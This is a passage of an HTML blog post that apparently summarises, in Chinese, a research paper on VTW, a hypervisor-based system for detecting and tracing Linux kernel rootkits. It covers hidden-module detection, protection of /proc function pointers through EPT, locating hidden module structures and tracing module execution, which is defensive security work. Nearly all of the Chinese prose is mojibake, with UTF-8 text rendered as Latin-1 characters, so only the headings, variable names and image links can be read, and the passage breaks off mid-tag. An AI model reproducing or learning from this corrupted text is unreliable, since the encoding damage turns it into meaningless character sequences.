ç¯¡æ”¹çš„ç›®æ ‡æ•°æ®å¯èƒ½ä¼šå­˜æ”¾åœ¨åŒä¸€å¼ é¡µä¸­ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•é€šè¿‡é™åˆ¶å†…å­˜é¡µçš„å†™æƒé™æ¥é¢„é˜²å†…æ ¸ rootkits ç¯¡æ”¹å†…æ ¸æ•°æ®ã€‚</p><p>æ­¤å¤–ï¼Œæ”»å‡»æ—¶é—´çš„éšæœºæ€§ä½¿å¾—å®æ—¶æ£€æµ‹ç¯¡æ”¹æ“ä½œå˜å¾—å›°éš¾ã€‚é¢å¯¹è¿™äº›é—®é¢˜ï¼ŒVTW è·Ÿè¸ª LKMs çš„æ‰§è¡Œï¼Œå¹¶åœ¨ LKM è¿½è¸ªä¸­æ£€æµ‹åŠ¨æ€å†…æ ¸æ•°æ®ã€‚</p><h3 id="5-2-1-Hidden-Kernel-Detection"><a href="#5-2-1-Hidden-Kernel-Detection" class="headerlink" title="5.2.1 Hidden Kernel Detection"></a>5.2.1 Hidden Kernel Detection</h3><p>è‡ªæˆ‘éšè—æ˜¯å†…æ ¸ rootkit çš„åŸºæœ¬ç‰¹æ€§ï¼Œéšè—è¡Œä¸ºå¯ä»¥è¢«ä½œä¸ºåˆ¤æ–­ä¸€ä¸ª LKM æ˜¯å¦ä¸ºä¸€ä¸ª rootkit çš„æ ‡å‡†ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå†…æ ¸ rootkits åœ¨åˆå§‹åŒ–æ—¶å®ç°è‡ªæˆ‘éšè—ã€‚</p><p>å› æ­¤ï¼ŒVTW éœ€è¦åœ¨å…¶åˆå§‹åŒ–å®Œæˆä¹‹å‰æ£€æµ‹å…¶æ˜¯å¦è¢«éšè—ã€‚ä¸ºäº†è¿½è¸ªæ¨¡å—åˆå§‹åŒ–ï¼Œæˆ‘ä»¬åœ¨ $sys_init_module()$ è®¾ç½®äº†ä¸€ä¸ªæŒ‡ä»¤æ–­ç‚¹å¹¶ç›‘æ§ LKM çš„çŠ¶æ€æ”¹å˜ã€‚å½“çŠ¶æ€è¢«åˆ‡æ¢åˆ° $MODULE_STATE_LIVE$ æ—¶ï¼ŒVTW ä¼šæ£€æŸ¥æ¨¡å—æ˜¯å¦è¢«éšè—ã€‚å†…æ ¸ rootkits é€šè¿‡ä»é“¾è¡¨ä¸Šç§»é™¤ä»–ä»¬çš„çŠ¶æ€æè¿°ç¬¦æ¥ç ´åä¸å…¶ä»–å¯¹è±¡çš„é€»è¾‘è¿æ¥ä»¥è¿›è¡Œéšè—ï¼ŒLKMs ä¹‹é—´çš„é€»è¾‘è¿æ¥å¯ä»¥è¢«ç”¨æ¥ç¡®è®¤æ¨¡å—æ˜¯å¦è¢«éšè—ã€‚</p><p>$\mathscr{M}$c ä¸º LKM æ­£åœ¨è¢«è£…è½½ï¼Œ$\mathscr{M}$p ä¸ºè¢«$\mathscr{M}$c ä¸­çš„æ¡ç›® $prev$ æŒ‡å‘çš„æ¨¡å—ï¼Œ$\mathscr{M}$n ä¸ºè¢« $\mathscr{M}$c ä¸­æ¡ç›® $next$ æ‰€æŒ‡å‘çš„æ¨¡å—ï¼ˆè¡¨4 ä¸­çš„ â‘¦~â‘§ï¼‰ã€‚è‹¥æ¨¡å— $\mathscr{M}$c ä¸å…¶ç›¸é‚»èŠ‚ç‚¹å¹¶ä¸å­˜åœ¨é“¾è¡¨è¿æ¥å…³ç³»ï¼ˆâ€œRootkit æ”»å‡»æ£€æµ‹â€ ä¸­çš„æ­¥éª¤ 6 ï¼‰ï¼Œæˆ–è¿æ¥å…³ç³»ä¸å®Œæ•´ï¼ˆæ­¥éª¤ 7 ~ 8ï¼‰ï¼Œåˆ™æˆ‘ä»¬åˆ¤æ–­ æ¨¡å— $\mathscr{M}$c è¢«éšè—äº†ã€‚</p><h3 id="5-2-2-Dynamic-Kernel-Data-Detection"><a href="#5-2-2-Dynamic-Kernel-Data-Detection" class="headerlink" title="5.2.2 Dynamic Kernel Data Detection"></a>5.2.2 Dynamic Kernel Data Detection</h3><p>é™¤äº†çŠ¶æ€æè¿°ç¬¦å¤–ï¼Œå†…æ ¸ rootkits è¿˜ä¼šç¯¡æ”¹å¸¦æœ‰æ§åˆ¶å±æ€§çš„å†…æ ¸æ•°æ®ä»¥è¿›è¡Œå†…æ ¸æ§åˆ¶æµé‡å®šå‘ã€‚åœ¨é‡å®šå‘å‰è¿™ç±»å†…æ ¸æ•°æ®åˆæŒ‡å‘å†…æ ¸ä»£ç æ®µçš„æŒ‡é’ˆç»„æˆï¼Œå†…æ ¸ rootkits é‡å†™æŒ‡é’ˆä»¥é‡å®šå‘åˆ°ä»–ä»¬çš„è‡ªå®šä¹‰ä»£ç ã€‚</p><p>è¢«é‡å®šå‘çš„å¯¹è±¡ä¸»è¦åŒ…æ‹¬å¤šç§ç”¨äºæ„å»ºæ“ä½œç³»ç»Ÿè¯­ä¹‰è§†è§’çš„æ“ä½œå‡½æ•°ã€‚$â€procâ€$ æ–‡ä»¶ç³»ç»Ÿä¸­çš„å‡½æ•°æŒ‡é’ˆï¼ˆä¾‹å¦‚ $lookup$ï¼‰å¯¹å†…æ ¸ rootkits è€Œè¨€ä¸ºæœ€è„†å¼±çš„å¯¹è±¡ï¼Œå› æ­¤æœ‰å¿…è¦ä¿æŠ¤è¿™äº›å‡½æ•°æŒ‡é’ˆä¸è¢«ç¯¡æ”¹ã€‚</p><p>ä¸ºäº†éšè—ç½‘ç»œè¿æ¥ï¼ˆä¾‹å¦‚ç½‘ç»œç«¯å£ï¼‰ï¼Œå†…æ ¸ rootkits è¿˜ä¼šæ”»å‡»  $â€&#x2F;proc&#x2F;net&#x2F;tcpâ€$ã€$â€&#x2F;proc&#x2F;net&#x2F;tcp6â€$ ã€$â€&#x2F;proc&#x2F;net&#x2F;udpâ€$ ã€$â€&#x2F;proc&#x2F;net&#x2F;udp6â€$ ä¸­çš„æ•°æ®ï¼Œå› æ­¤è¿™äº›æ–‡ä»¶æè¿°ç¬¦ä¸­çš„å‡½æ•°æŒ‡é’ˆåŒæ ·éœ€è¦è¢«ä¿æŠ¤ã€‚</p><p>é™¤äº†ä¸Šè¿°å†…æ ¸å¯¹è±¡ï¼ŒVTW è¿˜è¦å°†å¦‚ $â€rootâ€$ ä¸ $â€logâ€$ è¿™æ ·å…³é”®æ–‡ä»¶çš„å‡½æ•°æŒ‡é’ˆä½œä¸ºä¿æŠ¤å¯¹è±¡ã€‚æ‰€æœ‰çš„å‡½æ•°æŒ‡é’ˆä¸ä»–ä»¬çš„å­˜å‚¨åœ°å€å¯ä»¥åœ¨ VTW åˆå§‹åŒ–ä¸­é€šè¿‡ç‰¹å®šçš„æ•°æ®ç»“æ„ï¼ˆå¦‚ $f_dentry-&gt;d_inode-&gt;i_op-&gt;lookup$ï¼‰ä»å†…å­˜ä¸­æå–ã€‚</p><p>æ‰€æœ‰è¢«æå–çš„æ•°æ®å½¢æˆä¸€ä¸ªé›†åˆ $k$ ï¼Œ$k$ ä¸­æ‰€æœ‰çš„åŠ¨æ€å†…æ ¸æ•°æ®æŒ‡å‘å›ºå®šçš„å†…æ ¸å‡½æ•°ä¸”ä¸éœ€è¦è¢«æ›´æ–°ã€‚ä»…å½“æˆ‘ä»¬å‘ç°ä¸€ä¸ªæ–°çš„å†…æ ¸ rootkit ä¿®æ”¹ä¸€ä¸ªä¸åœ¨ $k$ ä¸­çš„æŸäº›å†…æ ¸æ•°æ®æ—¶æˆ‘ä»¬æ‰æ‰©å±• $k$ã€‚æ­¤å¤–ï¼ŒVTW é€šè¿‡ EPT å°† $k$ è®¾ç½®ä¸ºè¯»å†™ä¿æŠ¤ï¼Œå¹¶ç¦æ­¢ â€œguestâ€ ä¸­çš„æ‰§è¡Œå®ä½“è®¿é—® $k$ ä»¥ä¿æŠ¤ä»–ã€‚</p><p>ç°åœ¨ $k$ å ç”¨å¤§æ¦‚ 64KB çš„å†…å­˜ä¸”åŒ…å« 4000 ä»½å†…æ ¸æ•°æ®ï¼Œå…¶å°†æ ¹æ®æ–° rootkits çš„çªå‘æƒ…å†µè€Œå¢é•¿ã€‚åœ¨å®æˆ˜ä¸­ï¼Œç°æœ‰çš„å†…æ ¸ rootkits é€šå¸¸ä¿®æ”¹ä¸è¶…è¿‡ 500 ä»½å†…æ ¸æ•°æ®ã€‚æˆ‘ä»¬å°†èŒƒå›´æ‰©å¤§ä»¥è¿›è¡Œæ›´å¥½çš„ä¿æŠ¤ã€‚</p><p>$k$ ä¸­çš„æ¯ä¸ªå…ƒç´  $D$ å¯¹åº”ä¸€ä¸ªç‹¬ç‰¹çš„å†…æ ¸å¯¹è±¡ï¼ˆè¡¨ 4 ä¸­çš„ â‘¨ï¼‰ã€‚å…ƒç´  $D$i ä½œä¸ºäºŒå…ƒæ•°æ®å¯¹ ï¼ˆ$a$iï¼Œ$c$iï¼‰å­˜åœ¨ï¼Œ$a$i è¡¨ç¤ºè¢«ä¿æŠ¤çš„æ•°æ®çš„åœ°å€ï¼Œ$c$i åˆ™è¡¨ç¤ºæ•°æ®å†…å®¹ï¼ˆâ‘©ï¼‰ã€‚X ä¸ºå†…æ ¸ä»£ç èŒƒå›´$s \sim _\mathscr{e}$ ï¼ˆâ‘ªï¼‰çš„èŒƒå›´ã€‚</p><p>åœ¨ LKM çš„æ‰§è¡Œä¸­ï¼ŒVTW ä¼šæ£€æµ‹åœ°å€ $a$i ä¸Šçš„å†…æ ¸æ•°æ® $c$i$â€™$ æ˜¯å¦æŒ‡å‘å†…æ ¸ä»£ç æ®µï¼ˆâ‘«ï¼‰ã€‚è‹¥å­˜åœ¨ $c$i å¹¶ä¸æŒ‡å‘å†…æ ¸ä»£ç æ®µï¼Œåˆ™å…¶å¯ä»¥ç¡®è®¤å†…æ ¸æ§åˆ¶æµè¢«é‡å®šå‘äº†ï¼ˆâ€œRootkit æ”»å‡»æ£€æµ‹â€ ä¸­çš„ 10ï¼‰ã€‚åœ¨æ£€æµ‹åˆ°è¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ® $c$i$â€™$ åï¼ŒVTW è¯»å–åœ¨ $D$i ä¸­ä¿å­˜çš„  $c$i å¹¶å°†å…¶å†™å…¥åˆ° $D$i.$a$i ï¼ˆæ­¥éª¤ 11ï¼‰ã€‚ä¹‹åè¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®æ¢å¤åˆ°äº†å…¶åˆå§‹å€¼ã€‚</p><p>ä¸å†…æ ¸ rootkits ä¸åŒï¼Œåˆæ³•çš„ LKMs ä¸ä¼šä¿®æ”¹çŠ¶æ€æè¿°ç¬¦ä»¥è¿›è¡Œè‡ªæˆ‘éšè—ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹å¸¦æœ‰ç³»ç»Ÿå‡½æ•°æŒ‡å‘ç‰¹æ€§çš„æ‰©å±•æ•°æ®ä»¥è¿›è¡Œæ§åˆ¶æµé‡å®šå‘ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬ä¿æŠ¤åŠ¨æ€å†…æ ¸æ•°æ®çš„æ–¹æ³•ä¸ºåœ¨ LKM æ‰§è¡Œçš„ç‰¹å®šé˜¶æ®µæ£€æŸ¥è¢«ä¿æŠ¤æ•°æ®çš„å®Œæ•´æ€§ï¼ˆä¾‹å¦‚è°ƒåº¦ä¸è·³è½¬ï¼‰ï¼Œè€Œéé™åˆ¶æ‰€æœ‰æ‰§è¡Œå®ä½“å¯¹å±äºå†…æ ¸æ•°æ®çš„æ•°æ®ç»“æ„çš„è®¿é—®ã€‚ç»“æœä¾¿æ˜¯ VTW å¯ä»¥ä»æ‰€æœ‰çš„ LKMs ä¸­è¯†åˆ«å‡º rootkits ä¸”ä¸ä¼šå½±å“åˆ°å…¶ä»– LKMs çš„æ‰§è¡Œã€‚</p><h2 id="5-3-Bypassing-Resistance-of-VTW-Effects"><a href="#5-3-Bypassing-Resistance-of-VTW-Effects" class="headerlink" title="5.3 Bypassing Resistance of VTW Effects"></a>5.3 Bypassing Resistance of VTW Effects</h2><p>ä»¥ VTW çš„åŠ è½½æ—¶é—´ä½œä¸ºåˆ†ç•Œç‚¹ï¼ŒLKMs å¯ä»¥è¢«åˆ†ä¸ºå·²è¢«è£…è½½çš„ LKMs ä¸æœªè¢«è£…è½½çš„ LKMsã€‚å½“ VTW è¢«æˆåŠŸåŠ è½½åï¼Œå…¶å¯ä»¥åŠæ—¶ç›‘æ§å¹¶æ§åˆ¶æ‰€æœ‰æœªè¢«è£…è½½çš„ LKMs çš„è£…è½½ä¸æ‰§è¡Œï¼Œä½¿å…¶æ— æ³•ç»•è¿‡æ£€æµ‹ã€‚</p><p>å¯¹äºåœ¨ VTW è½½å…¥å‰è¢«è£…è½½çš„ LKMsï¼ŒVTW æ— æ³•åœ¨ â€œhostâ€ æ¨¡å¼ä¸‹å¸¸è§„åœ°æ£€æµ‹ä¸è·Ÿè¸ªï¼Œå› ä¸ºè¿™ä¼šæé«˜ç»•è¿‡ VTW çš„é£é™©ã€‚</p><p>æœ‰ä¸¤ä¸ªè§£å†³è¯¥é—®é¢˜çš„æ–¹æ³•ã€‚å…¶ä¸€æ˜¯å°† VTW è®¾ä¸ºå¼€æœºæ—¶å¯åŠ¨ï¼Œè¿™æ ·ç»å¤§éƒ¨åˆ†çš„ LKMs éƒ½ä¼šè¢«åŒ…å«åœ¨ç›‘æ§èŒƒå›´å†…ï¼Œç„¶è€Œè¿™ç§åŠæ³•å¯¹äºé‚£äº›åŒæ ·åœ¨å¼€æœºæ—¶å¯åŠ¨çš„ LKMs è€Œè¨€ä»æ˜¯æ— æ•ˆçš„ã€‚</p><p>ç¬¬äºŒç§æ–¹æ³•ä¾¿æ˜¯ä½¿ç”¨å†…æ ¸å®Œæ•´æ€§æ£€æŸ¥çš„åŠæ³•æ¥å®šä½æœ‰å®³çš„ LKMã€‚è¢«é‡å®šå‘çš„æ§åˆ¶æµå±äº rootkitsï¼Œå¯ä»¥é€šè¿‡å°† LKM åˆ—è¡¨ä¸­çš„æ§åˆ¶æµåœ°å€ï¼ˆ$mal_addr$ï¼‰ä¸æ¯ä¸ªä»£ç æ®µï¼ˆ$module-&gt;core,module-&gt;core+module-&gt;core_size$ï¼‰è¿›è¡Œé…å¯¹ä»¥ç¡®å®š rootkit æ˜¯å¦å·²è¢«éšè—ã€‚è‹¥æ˜¯ï¼Œ$mal_addr$ å°†è¢«ä½œä¸ºå®šä½éšè— LKM çš„èµ·å§‹ç‚¹ã€‚è¿‡ç¨‹å¦‚ å›¾.4 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/08/ZY8sMaE7ehj2BSH.png" alt="å›¾.4 å®šä½éšè—çš„â€œstruct moduleâ€"></p><p>LKM çš„ä»£ç æ®µä¸æ•°æ®æ®µåœ¨è™šæ‹Ÿç©ºé—´ä¸­æ˜¯è¿ç»­çš„ï¼Œä»–ä»¬çš„æœ€åä¸€çº§é¡µè¡¨é¡¹æ˜¯ç›¸é‚»çš„ã€‚å› æ­¤ï¼Œé€šè¿‡ä½¿ç”¨ä»–ä»¬ä¹‹é—´ä¸åŒçš„å¯æ‰§è¡Œæ€§ï¼ˆæœ€åä¸€çº§é¡µè¡¨é¡¹çš„ NX ä½ï¼‰ï¼Œä»£ç æ®µçš„æœ«å°¾åœ°å€ï¼ˆ$code_end$ï¼‰ä¸æ•°æ®æ®µçš„èµ·å§‹åœ°å€ï¼ˆ$data_start$ï¼‰å¯ä»¥è¢«è¯†åˆ«ã€‚</p><p>åœ¨è¿™ä¹‹åï¼Œæˆ‘ä»¬ä½¿ç”¨æ•°æ®æ®µçš„è¯»å†™æƒé™ï¼ˆæœ€åä¸€çº§é¡µè¡¨é¡¹çš„ RW ä½ï¼‰æ¥è·å¾—å¯å†™æ•°æ®æ®µçš„èµ·å§‹åœ°å€ï¼ˆ$writable_data_start$ï¼‰ã€‚LKM çš„çŠ¶æ€æè¿°ç¬¦ï¼ˆ$struct\ module$ï¼‰ä¾¿å­˜æ”¾åœ¨å¯å†™æ•°æ®æ®µä¸­ã€‚</p><p>æ ¹æ® LKM ä»£ç æ®µæŒ‰é¡µå¯¹é½çš„ç‰¹æ€§ï¼Œä»£ç æ®µçš„èµ·å§‹åœ°å€ä¸º $data_start$-$N * page_size$ ï¼Œå…¶å€¼ä¸º $module-&gt;module_core$ã€‚ä» $writable_data_start$ å¼€å§‹ï¼Œæˆ‘ä»¬å‡è®¾æ¯ä¸ªå­—èŠ‚çš„èµ·å§‹åœ°å€ä¾¿æ˜¯ LKM ä»£ç çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åŸºäº $module-&gt;module_core$ ä¸ $module-&gt;core_text_size$ é—´çš„ç›¸å¯¹ä½ç§»è®¡ç®— $module-&gt;core_text_size$ çš„åœ°å€ï¼Œå¯¹  $module-&gt;module_core$ ä¸ $module-&gt;core_text_size$  çš„æ­£ç¡®è¡¨ç¤ºä¸ºæœ€å 12 ä½éƒ½ä¸º0ã€ä¸¤è€…æ€»å’Œä½ $data_start$ã€‚</p><p>ä¹‹åæˆ‘ä»¬ä»¥ä¸€ä¸ªå•å­—èŠ‚ä½œä¸ºæ­¥é•¿æ£€æŸ¥æ‰€æœ‰åœ¨ $writable_data_start$ ä¹‹åçš„å†…å­˜ï¼Œç›´åˆ°æˆ‘ä»¬è·å¾—åˆé€‚çš„ $module-&gt;module_core$ ä¸ $module-&gt;core_text_size$ ã€‚æœ€åï¼Œmodule ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªåœ°å€ä½¿ç”¨ä¸ $struct\ module$ ç›¸å…³çš„ $module-&gt;module_core$ çš„åç§»è¿›è¡Œè®¡ç®—ã€‚ç›¸æ¯”äºç¬¬ä¸€ç§æ–¹æ³•ï¼Œè¿™ç§æ–¹æ³•æœ‰ç€æ›´å¤§çš„èŒƒå›´ï¼Œä½†å®ç°è¿‡ç¨‹ç›¸å¯¹æ›´åŠ å¤æ‚ã€‚ VTW åŒæ—¶ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ¥è¾¾æˆæœ€ä½³çš„é˜²æŠ¤æ•ˆæœã€‚</p><h1 id="6-Rootkit-Tracing-Process"><a href="#6-Rootkit-Tracing-Process" class="headerlink" title="6 Rootkit Tracing Process"></a>6 Rootkit Tracing Process</h1><p>å†…æ ¸ rootkit å¯èƒ½åœ¨ LKM æ­£åœ¨åŠ è½½æ—¶æˆ–å·²è¢«åŠ è½½åå‘åŠ¨æ”»å‡»ï¼Œå•æ¬¡æ”»å‡»çš„å‚ä¸è€…å¯èƒ½æ˜¯å•ä¸ªæˆ–å¤šä¸ªæ¨¡å—ã€‚</p><p>æˆ‘ä»¬å°†ä¿®æ”¹å†…æ ¸æ•°æ®çš„ç›´æ¥å‘èµ·è€…ä½œä¸ºè¡Œä¸ºè½½ä½“ï¼Œæ”»å‡»çš„æœ€åˆå‘èµ·è€…ç§°ä¸ºåŠ¨ä½œè½½ä½“ï¼Œå…¶ä»£ç æ›¿æ¢äº†åŸå§‹å†…æ ¸å‡½æ•°çš„ LKM ç§°ä¸ºå‡½æ•°è½½ä½“ã€‚</p><p>ä¸ºäº†è¿½è¸ªæ‰€æœ‰å‚ä¸äº†ä¸€æ¬¡æ”»å‡»çš„å†…æ ¸ rootkitsï¼ŒVTW å¸¦æ¥äº†ä¸¤ç§æ–°çš„æ–¹æ³•ï¼šâ€œè·Ÿè¸ªæ­¤å‰ä¸æ­¤åçš„ rootkit æ”»å‡»â€ ä¸ â€œæ”»å‡»å›æ”¾ç¨‹åºâ€ï¼Œè¿™äº›æ–¹æ³•æ‰€éœ€çš„æ¡ä»¶å¦‚ è¡¨5 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/09/mnQvHSb8W5ANkg4.png" alt="image.png"></p><p>å…¶ä»–å‚ä¸äº†æ”»å‡»çš„ LKMs è¢«ç§°ä¸ºè¿‡ç¨‹è½½ä½“ã€‚è¿™äº›è½½ä½“ä¹‹é—´å¯èƒ½å­˜åœ¨é‡å ï¼Œä¾‹å¦‚æ­£åœ¨è¢«è£…è½½çš„ LKM å¯ä»¥é‡å®šå‘å†…æ ¸æ§åˆ¶æµåˆ°å¯¼å‡ºå‡½æ•°ï¼Œåœ¨è¿™æ¬¡æ”»å‡»è®¾æƒ³ä¸­ï¼ŒLKM åŒæ—¶å±äºåŠ¨ä½œè½½ä½“ä¸è¡Œä¸ºè½½ä½“ï¼Œè¢«è£…è½½çš„ LKM å±äºå‡½æ•°è½½ä½“ï¼Œä¸å­˜åœ¨è¿‡ç¨‹è½½ä½“ã€‚</p><p>æ‰€æœ‰è¢«ç›‘æ§çš„ LKMs å½¢æˆäº†å…ƒç»„ $T$ ï¼Œæ‰€æœ‰å‚ä¸äº†åŒä¸€äº‹ä»¶çš„ LKMs å½¢æˆäº†å…ƒç»„ $\mathscr{R}$ ï¼ˆè¡¨5 ä¸­çš„â‘ ï¼‰ã€‚å½“ä¸€ä¸ª LKM æ­£åœ¨è¿è¡Œï¼Œæˆ‘ä»¬å¼€å¯å…¶æ‰§è¡Œæƒé™ï¼ŒåŒæ—¶é™¤äº†åœ¨å…¶ä»– CPU æ ¸å¿ƒä¸Šæ­£åœ¨è¿è¡Œçš„ LKMs ä»¥å¤–ï¼Œå…¶ä»–æ‰€æœ‰ LKMs çš„æ‰§è¡Œæƒé™éƒ½è¢«å…³é—­ï¼ˆâ‘¡ï¼‰ã€‚æ‰€æœ‰è¿è¡Œåœ¨ä¸åŒæ ¸å¿ƒä¸Šçš„ LKMs å½¢æˆä¸€ä¸ªå…ƒç»„ $\mathscr{F}$ ï¼ˆè¡¨5 ä¸­çš„ â‘¢ï¼‰ã€‚è¦è¢«è°ƒåº¦ä»¥æ‰§è¡Œçš„ LKM ï¼ˆ$\mathscr{F}$jï¼‰ä¸ç¬¬ k ä¸ª CPU æ ¸å¿ƒå…³è”ï¼ˆâ‘£ï¼‰ï¼ŒLKM æ‰€å±çš„å†…å­˜è¢«è®°å½•ä¸º $\alpha$ ï¼ˆâ‘¤ï¼‰ã€‚</p><h2 id="6-1-Trace-LKM-Execution-Events"><a href="#6-1-Trace-LKM-Execution-Events" class="headerlink" title="6.1 Trace LKM Execution Events"></a>6.1 Trace LKM Execution Events</h2><p>æœ‰ä¸‰ç§æ‰§è¡Œ rootkit çš„æ–¹å¼ï¼Œç¬¬ä¸€ç§ä¸º LKM åœ¨æ¨¡å—åŠ è½½æ—¶è°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ”»å‡»å¯èƒ½åœ¨åŠ è½½å®Œæˆå‰è¢«å¯åŠ¨ã€‚</p><p>ç¬¬äºŒç§ä¸º LKM åœ¨å®Œæˆè½½å…¥ä¹‹åå…¶å¯¼å‡ºå‡½æ•°è¢«å…¶ä»–æ¨¡å—è°ƒç”¨ï¼Œè¢«åŠ è½½çš„ LKM å¯ä»¥è¢«è°ƒç”¨ä»¥ä¿®æ”¹å†…æ ¸æ•°æ®ï¼Œæˆ–æ˜¯è¢«ç”¨ä½œå‡½æ•°è½½ä½“æ¥æ›¿æ¢å†…æ ¸çš„åŸå§‹å‡½æ•°ã€‚</p><p>ç¬¬ä¸‰ç§ä¸º LKM è¢«é€šè¿‡åˆ›å»ºä¸€ä¸ªå†…æ ¸çº¿ç¨‹è€Œæ‰§è¡Œï¼Œæ”»å‡»å¯ä»¥åœ¨çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸçš„ä»»æ„æ—¶é—´è¢«è§¦å‘ã€‚</p><p>ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»å¯èƒ½åŒ…æ‹¬ä¸€ç§æˆ–å¤šç§ä¸Šè¿°çš„æ‰§è¡Œã€‚ä¸ºäº†ç›‘æ§ LKM çš„æ‰§è¡Œï¼ŒVTW è®¾ç½®äº†ç›®æ ‡å·²è¢«è£…è½½ LKMs ä¸ºä¸å¯æ‰§è¡Œã€‚</p><p>ç„¶è€Œç”±äºå¤§é‡çš„å†…å­˜è®¾ç½®æ“ä½œï¼Œè¿™ç§åŠæ³•æ˜¯ä½æ•ˆçš„ã€‚ä»¥ä¸€ä¸ªæœ‰ç€ 4MB ä»£ç æ®µçš„ LKM ä¸ºä¾‹ï¼ŒVTW å¿…é¡»è¦æ“ä½œ EPT é¡µè¡¨å¤šä½™ 2000 æ¬¡ä»¥å®Œæˆä¸€æ¬¡æ‰§è¡Œæƒé™çš„å¼€å¯ä¸å…³é—­ã€‚ä¸ºäº†å‡å°‘é¡µè¡¨è®¾ç½®æ“ä½œçš„æ•°é‡ï¼ŒVTW å»ºç«‹äº†ä¸€ç§æœºåˆ¶æ¥ç®¡ç† LKM çš„æ‰§è¡Œæƒé™ï¼Œå¦‚ å›¾.5 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/09/WcROlmhj4Yix2Aw.png" alt="å›¾.5 é¡µè¡¨é‡å®šå‘æœºåˆ¶"></p><p>VTW é¦–å…ˆé€šè¿‡ $â€struct \ moduleâ€$ è·å¾— LKM ä»£ç æ®µçš„åœ°å€èŒƒå›´ï¼Œæ¥ä¸‹æ¥å…¶è®¡ç®—æœ€åä¸€çº§å¯ä»¥æŸ¥æ‰¾æ•´ä¸ª LKM ä»£ç åœ°å€èŒƒå›´çš„é¡µè¡¨ï¼ˆ$last_page_table$ï¼‰ã€‚åœ¨å…¶ä¸Šå±‚é¡µè¡¨ä¿å­˜äº† $last_page_table$ åœ°å€çš„é¡µè¡¨å…¥å£ ï¼ˆ$orig_item$ ï¼‰å°†ä¼šè¢«è®°å½•ã€‚</p><p>åœ¨è¿™ä¹‹åï¼ŒVTW åˆ›å»ºä¸€ä¸ªæ–°çš„é¡µè¡¨ ï¼ˆ$new_last_page_table$ï¼‰ å¹¶é€šè¿‡ EPT å°†å…¶è®¾ä¸º â€œä¸å¯å†™â€ã€‚å…¶ä¼šä½¿ç”¨ $new_last_page_table$ çš„åœ°å€è¦†å†™ $orig_item$ã€‚æ¥ä¸‹æ¥ VTW å°† $last_page_table$ çš„æ‰€æœ‰å†…å®¹æ‹·è´åˆ° $new_last_page_table$ ä¸­ã€‚ä¸æ­¤åŒæ—¶å…¶ä¼šä¸ºæ¯ä¸ªç›®æ ‡ LKM åˆ›å»ºä¸€ä»½å†…å­˜é¡µå¹¶é€šè¿‡ EPT å°†å…¶è®¾ä¸º â€œä¸å¯æ‰§è¡Œâ€ï¼Œè¯¥å†…å­˜é¡µè¢«ç§°ä¹‹ä¸º $fake_code$ï¼Œå…¶åœ°å€åˆ™ä¸º $fake_mem$ã€‚</p><p>æœ€åï¼Œ LKM çš„ä»£ç æ®µ åœ¨ $new_last_page_table$ ä¸­å¯¹åº”çš„çš„æ‰€æœ‰æ¡ç›®éƒ½è¢«å¡«å……ä¸º $fake_mem$ï¼Œè‹¥æˆ‘ä»¬å°è¯•æ‰“å¼€ LKM çš„æ‰§è¡Œï¼Œåˆ™ $orig_item$ å°†è¢«ç”¨ $fake_mem$ é‡å†™ã€‚ç”±æ­¤ï¼Œæ§åˆ¶æµå°†ä¼šè¢«é‡å®šå‘åˆ° $fake_code$ ä¸Šã€‚ EPT å¼‚å¸¸åœ°å€ï¼ˆ$fake_item$ï¼‰å°†è¯´æ˜å“ªä¸€ä¸ª LKM å°†è¦è¢«æ‰§è¡Œã€‚</p><p>åœ¨ LKM æ‰§è¡Œä¸­ï¼Œç¬¬ä¸€ä¸ªè¢«æ‰§è¡Œçš„ LKM ç§°ä¹‹ä¸ºç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå‘å‡ºäº†æ¨¡å—é—´è°ƒç”¨è¯·æ±‚çš„ LKM è¢«ç§°ä¸ºæ´»åŠ¨æ¨¡å—ï¼Œè¢«è°ƒç”¨çš„ LKM è¢«ç§°ä¸ºè¢«è°ƒç”¨æ¨¡å—ã€‚</p><p>åœ¨ç¬¬ä¸€ä¸ª LKM è¢«æ‰§è¡Œå‰ï¼ŒVTW è¯»å–è°ƒç”¨å‡½æ•°å‚¨å­˜åœ¨å†…æ ¸æ ˆä¸Šçš„è¿”å›åœ°å€å¹¶åœ¨æ­¤å¤„è®¾ç½®ä¸€ä¸ªæ‰§è¡Œæ–­ç‚¹ï¼Œæ¥ä¸‹æ¥ VTW å¯ç”¨ LKM çš„æ‰§è¡Œæƒé™ã€‚å½“æ§åˆ¶æµåœ¨ LKMs ä¹‹é—´åˆ‡æ¢æ—¶ï¼Œæˆ‘ä»¬è¿½è¸ªæ§åˆ¶æµæµè¿‡çš„æ‰€æœ‰ LKMsã€‚è¿½è¸ªæ–¹æ¡ˆå¦‚ä¸‹æ‰€ç¤ºã€‚</p><h2 id="6-2-Forward-Versus-Backward-of-Rootkit-Attack"><a href="#6-2-Forward-Versus-Backward-of-Rootkit-Attack" class="headerlink" title="6.2 Forward Versus Backward of Rootkit Attack"></a>6.2 Forward Versus Backward of Rootkit Attack</h2><p>rootkits æ”»å‡»åœ¨å¦‚ä¸‹æ‰€ç¤ºçš„ 11 ä¸ªæ­¥éª¤çš„å‰å‘ä¸åå‘é˜¶æ®µä¸­è¢«å®æ–½ã€‚è¯¥æ–¹æ³•ç”¨ä»¥ç›‘æ§ LKM æ§åˆ¶æµçš„è·³è½¬ä¸è¿”å›ã€‚æ­¥éª¤ 1 ~ 6 ç›‘æ§è·³è½¬ï¼Œæ­¥éª¤ 7 ~ 11ç›‘æ§è¿”å›è¿‡ç¨‹ã€‚</p><p><img src="https://s2.loli.net/2023/04/09/XmxawZS56dG38kT.png" 